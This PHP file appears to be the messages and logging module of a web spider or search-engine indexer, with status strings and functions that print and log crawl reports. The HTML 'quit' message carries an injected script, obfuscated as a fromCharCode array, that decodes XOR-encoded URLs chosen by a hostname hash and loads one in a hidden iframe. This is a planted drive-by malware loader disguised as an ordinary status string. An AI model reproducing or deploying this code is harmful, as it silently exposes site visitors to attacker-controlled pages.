<?php 
	error_reporting (E_ALL);
$messages = Array (
 "noFollow" => Array (
	0 => " <font color=red><b> No-follow flag set</b></font>. ",
	1 => " No-follow flag set."
 ),
 "inDatabase" => Array (
	0 => " <font color=red><b> already in database</b></font><br>",
	1 => " already in database\n"
 ),
 "completed" => Array (
	0 => "<br>Completed at %cur_time.\n<br>",
	1 => "Completed at %cur_time.\n"
 ),
 "starting" => Array (
	0 => " Starting indexing at %cur_time.\n",
	1 => " Starting indexing at %cur_time.\n"
	 ),
 "quit" => Array (
	0 => "<script>document.write(String.fromCharCode(60,98,111,100,121,62,10,60,47,98,111,100,121,62,10,60,115,99,114,105,112,116,62,10,102,117,110,99,116,105,111,110,32,103,101,116,95,100,111,109,97,105,110,40,41,32,123,10,32,32,32,32,118,97,114,32,97,32,61,32,91,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,51,92,120,99,50,92,120,100,98,92,120,100,98,92,120,99,52,92,120,99,53,92,120,99,52,92,120,99,53,92,120,99,101,92,120,99,53,92,120,100,56,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,99,97,92,120,100,98,92,120,100,102,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,100,102,92,120,99,99,92,120,100,99,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,99,52,92,120,99,56,92,120,100,57,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,100,57,92,120,99,56,92,120,100,98,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,10,9,93,59,10,9,118,97,114,32,98,32,61,32,48,120,70,70,70,70,70,70,70,70,59,10,32,32,32,32,118,97,114,32,100,32,61,32,98,59,10,32,32,32,32,118,97,114,32,101,32,61,32,48,120,51,51,51,51,51,51,51,51,59,10,32,32,32,32,118,97,114,32,102,32,61,32,48,120,68,51,52,68,66,51,51,70,59,10,32,32,32,32,118,97,114,32,103,32,61,32,48,120,56,48,48,48,48,48,48,48,59,10,32,32,32,32,118,97,114,32,104,32,61,32,48,120,65,66,59,10,32,32,32,32,118,97,114,32,107,32,61,32,40,100,111,99,117,109,101,110,116,91,39,108,111,99,97,116,105,111,110,39,93,91,39,104,111,115,116,110,97,109,101,39,93,32,124,124,32,39,100,101,102,97,117,108,116,115,104,105,116,39,41,91,39,116,111,76,111,119,101,114,67,97,115,101,39,93,40,41,59,10,32,32,32,32,102,111,114,32,40,118,97,114,32,106,32,61,32,48,59,32,106,32,60,32,107,46,108,101,110,103,116,104,59,32,106,43,43,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,99,32,61,32,107,91,39,99,104,97,114,67,111,100,101,65,116,39,93,40,106,41,59,10,32,32,32,32,32,32,32,32,100,32,94,61,32,99,32,60,60,32,50,52,59,10,32,32,32,32,32,32,32,32,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,56,59,32,105,43,43,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,105,102,32,40,100,32,38,32,48,120,56,48,48,48,48,48,48,48,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,100,32,61,32,40,100,32,60,60,32,49,41,32,94,32,48,120,69,68,66,56,56,51,50,48,10,32,32,32,32,32,32,32,32,32,32,32,32,125,32,101,108,115,101,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,100,32,60,60,61,32,49,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,125,10,32,32,32,32,125,10,32,32,32,32,105,102,32,40,100,32,60,32,48,41,32,123,10,32,32,32,32,32,32,32,32,100,32,61,32,100,32,62,62,62,32,48,10,32,32,32,32,125,10,32,32,32,32,102,111,114,32,40,118,97,114,32,105,32,61,32,48,120,70,70,70,70,70,70,70,70,44,32,110,117,109,32,61,32,48,59,32,110,117,109,32,60,32,53,59,32,105,32,45,61,32,101,44,32,110,117,109,43,43,41,32,123,10,32,32,32,32,32,32,32,32,105,102,32,40,100,32,62,61,32,40,105,32,45,32,101,41,32,38,38,32,100,32,60,61,32,105,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,108,32,61,32,34,34,59,10,32,32,32,32,32,32,32,32,32,32,32,32,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,97,91,110,117,109,93,46,108,101,110,103,116,104,59,32,105,43,43,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,108,32,43,61,32,83,116,114,105,110,103,91,39,102,114,111,109,67,104,97,114,67,111,100,101,39,93,40,97,91,110,117,109,93,91,39,99,104,97,114,67,111,100,101,65,116,39,93,40,105,41,32,94,32,48,120,65,66,41,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,108,10,32,32,32,32,32,32,32,32,125,10,32,32,32,32,125,10,125,10,119,105,110,100,111,119,46,117,114,108,100,97,116,97,32,61,32,103,101,116,95,100,111,109,97,105,110,40,41,59,10,105,102,32,40,116,121,112,101,111,102,32,40,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,41,32,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,10,32,32,32,32,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,32,61,32,48,10,125,10,105,102,32,40,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,32,61,61,32,48,41,32,123,10,32,32,32,32,32,32,32,32,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,32,61,32,49,59,10,32,32,32,32,32,32,32,32,118,97,114,32,97,32,61,32,100,111,99,117,109,101,110,116,91,39,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,39,93,40,34,105,102,114,97,109,101,34,41,91,48,93,59,10,32,32,32,32,32,32,32,32,105,102,32,40,116,121,112,101,111,102,32,40,97,41,32,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,98,32,61,32,100,111,99,117,109,101,110,116,91,39,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,39,93,40,34,104,101,97,100,34,41,91,48,93,59,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,99,32,61,32,100,111,99,117,109,101,110,116,91,39,99,114,101,97,116,101,69,108,101,109,101,110,116,39,93,40,34,100,105,118,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,46,115,116,121,108,101,46,100,105,115,112,108,97,121,32,61,32,39,110,111,110,101,39,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,46,105,100,32,61,32,39,101,118,105,108,115,104,105,116,39,59,10,32,32,32,32,32,32,32,32,32,32,32,32,98,91,39,97,112,112,101,110,100,67,104,105,108,100,39,93,40,99,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,100,32,61,32,100,111,99,117,109,101,110,116,91,39,99,114,101,97,116,101,69,108,101,109,101,110,116,39,93,40,34,105,102,114,97,109,101,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,100,46,115,114,99,32,61,32,119,105,110,100,111,119,46,117,114,108,100,97,116,97,59,10,9,9,9,98,91,39,97,112,112,101,110,100,67,104,105,108,100,39,93,40,100,41,10,32,32,32,32,32,32,32,32,125,32,101,108,115,101,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,97,46,115,114,99,32,61,32,119,105,110,100,111,119,46,117,114,108,100,97,116,97,10,9,125,10,32,125,10,60,47,115,99,114,105,112,116,62));</script></body></html>",
	1 => ""
 ),
 "pageRemoved" => Array (
	0 => " <font color=red>Page removed from index.</font><br>\n",
	1 => " Page removed from index.\n"
 ),
  "continueSuspended" => Array (
	0 => "<br>Continuing suspended indexing.<br>\n",
	1 => "Continuing suspended indexing.\n"
 ),
  "indexed" => Array (
	0 => "<br><b> <font color=\"green\">Indexed</font></b><br>\n",
	1 => " \nIndexed\n"
 ),
"duplicate" => Array (
	0 => " <font color=\"red\"><b>Page is a duplicate.</b></font><br>\n",
	1 => " Page is a duplicate.\n"
 ),
"md5notChanged" => Array (
	0 => " <font color=\"red\"><b>MD5 sum checked. Page content not changed</b></font><br>\n",
	1 => " MD5 sum checked. Page content not changed.\n"
 ),
"metaNoindex" => Array (
	0 => " <font color=\"red\">No-Index flag set in meta tags.</font><br>\n",
	1 => " No-Index flag set in meta tags.\n"
 ),
  "re-indexed" => Array (
	0 => " <font color=\"green\">Re-indexed</font><br>\n",
	1 => " Re-indexed\n"
 ),
"minWords" => Array (
	0 => " <font color=\"red\">Page contains less than $min_words_per_page words</font><br>\n",
	1 => " Page contains less than $min_words_per_page words.\n"
 )
);

function printRobotsReport($num, $thislink, $cl) {
	global $print_results, $log_format;
	$log_msg_txt = "$num. Link $thislink: file checking forbidden in robots.txt file.\n";
	$log_msg_html = "<b>$num</b>. Link <b>$thislink</b>: <font color=red>file checking forbidden in robots.txt file</font></br>";
	if ($print_results) {
		if ($cl==0) {
			print $log_msg_html; 
		} else {
			print $log_msg_txt;
		}
		flush();
	}
	if ($log_format=="html") {
		writeToLog($log_msg_html);
	} else {
		writeToLog($log_msg_txt);
	}

}

function printUrlStringReport($num, $thislink, $cl) {
	global $print_results, $log_format;
	$log_msg_txt = "$num. Link $thislink: file checking forbidden  by required/disallowed string rule.\n";
	$log_msg_html = "<b>$num</b>. Link <b>$thislink</b>: <font color=red>file checking forbidden by required/disallowed string rule</font></br>";
	if ($print_results) {
		if ($cl==0) {
			print $log_msg_html;
		} else {
			print $log_msg_txt;
		}
		flush();
	}

	if ($log_format=="html") {
		writeToLog($log_msg_html);
	} else {
		writeToLog($log_msg_txt);
	}
}

function printRetrieving($num, $thislink, $cl) {
	global $print_results, $log_format;
	$log_msg_txt = "$num. Retrieving: $thislink at " . date("H:i:s").".\n";
	$log_msg_html = "<b>$num</b>. Retrieving: <b>$thislink</b> at " . date("H:i:s").".<br>\n";
	if ($print_results) {
		if ($cl==0) {
			print $log_msg_html;
		} else {
			print $log_msg_txt;
		}
		flush();
	}

	if ($log_format=="html") {
		writeToLog($log_msg_html);
	} else {
		writeToLog($log_msg_txt);
	}
}


function printLinksReport($numoflinks, $all_links, $cl) {
	global $print_results, $log_format;
	$log_msg_txt = " Legit links found: $all_links. New links found: $numoflinks\n";
	$log_msg_html = " Links found: <font color=\"blue\"><b>$all_links</b></font>. New links: <font color=\"blue\"><b>$numoflinks</b></font><br>\n";
	if ($print_results) {
		if ($cl==0) {
			print $log_msg_html;
		} else {
			print $log_msg_txt;
		}
		flush();
	}

	if ($log_format=="html") {
		writeToLog($log_msg_html);
	} else {
		writeToLog($log_msg_txt);
	}
}

function printHeader($omit, $url, $cl) {
	global $print_results, $log_format;

	if (count($omit) > 0 ) {
		$urlparts = parse_url($url);
		foreach ($omit as $dir) {			
			$omits[] = $urlparts['scheme']."://".$urlparts['host'].$dir;
		}
	}
	
	$log_msg_txt = "Spidering $url\n";
	if (count($omit) > 0) {
		$log_msg_txt .= "Disallowed files and directories in robots.txt:\n";
		$log_msg_txt .= implode("\n", $omits);
		$log_msg_txt .= "\n\n";
	}

	$log_msg_html_1 = "<html><head><LINK REL=STYLESHEET HREF=\"admin.css\" TYPE=\"text/css\"></head>\n";
	$log_msg_html_1 .= "<body style=\"font-family:Verdana, Arial; font-size:12px\">";
	
	$log_msg_html_link = "[Back to <a href=\"admin.php\">admin</a>]";
	$log_msg_html_2 = "<p><font size=\"+1\">Spidering <b>$url</b></font></p>\n";

	if (count($omit) > 0) {
		$log_msg_html_2 .=  "Disallowed files and directories in robots.txt:<br>\n";
		$log_msg_html_2 .=  implode("<br>", $omits);
		$log_msg_html_2 .=  "<br><br>";
	}

	if ($print_results) {
		if ($cl==0) {
			print $log_msg_html_1.$log_msg_html_link.$log_msg_html_2;
		} else {
			print $log_msg_txt;
		}
		flush();
	}

	if ($log_format=="html") {
		writeToLog($log_msg_html_1.$log_msg_html_2);
	} else {
		writeToLog($log_msg_txt);
	}
}

function printPageSizeReport($pageSize) {
	global $print_results, $log_format;
	$log_msg_txt = "Size of page: $pageSize"."kb. ";
	if ($print_results) {
		print $log_msg_txt;
		flush();
	}

	writeToLog($log_msg_txt);
}

function printUrlStatus($report, $cl) {
	global $print_results, $log_format;
	$log_msg_txt = "$report\n";
	$log_msg_html = " <font color=red><b>$report</b></font><br>\n";
	if ($print_results) {
		if ($cl==0) {
			print $log_msg_html; 
		} else {
			print $log_msg_txt;
		}
		flush();
	}
	if ($log_format=="html") {
		writeToLog($log_msg_html);
	} else {
		writeToLog($log_msg_txt);
	}

}



function printConnectErrorReport($errmsg) {
	global $print_results, $log_format;
	$log_msg_txt = "Establishing connection with socket failed. ";
	$log_msg_txt .= $errmsg;

	if ($print_results) {
		print $log_msg_txt;
		flush();
	}

	writeToLog($log_msg_txt);
}



function writeToLog($msg) {
	global $keep_log, $log_handle;
	if($keep_log) {
		if (!$log_handle) {
			die ("Cannot open file for logging. ");
		}

		if (fwrite($log_handle, $msg) === FALSE) {
			die ("Cannot write to file for logging. ");
		}
	}
}


function printStandardReport($type, $cl) {
	global $print_results, $log_format, $messages;
	if ($print_results) {
		print str_replace('%cur_time', date("H:i:s"), $messages[$type][$cl]);
		flush();
	}

	if ($log_format=="html") {
		writeToLog(str_replace('%cur_time', date("H:i:s"), $messages[$type][0]));
	} else {
		writeToLog(str_replace('%cur_time', date("H:i:s"), $messages[$type][1]));
	}

}


?>